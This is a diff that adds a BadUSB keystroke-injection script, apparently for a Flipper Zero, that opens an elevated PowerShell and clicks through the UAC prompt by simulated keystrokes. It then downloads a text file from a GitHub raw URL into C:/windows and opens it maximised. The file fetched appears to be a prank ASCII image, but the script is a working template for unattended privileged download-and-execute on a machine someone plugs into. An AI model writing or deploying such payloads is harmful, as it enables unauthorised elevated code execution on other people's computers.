@@ -1,0 +1,19 @@
+REM Author: Nota0x7
+REM Description: Will download selected .txt fileand run it
+DELAY 500
+GUI d
+DELAY 500
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 3000
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 1000
+ENTER
+DELAY 720
+STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/Nota0x7/FlipperZero-Files/main/BadUSB/Ascii%20Database/Resources/Faces/LOL!%20no%20text.txt -OutFile C:/windows/LOLNOTEXT81828.txt; Start-Process -FilePath "C:/windows/LOLNOTEXT81828.txt" -WindowStyle maximized
+DELAY 700
+ENTER
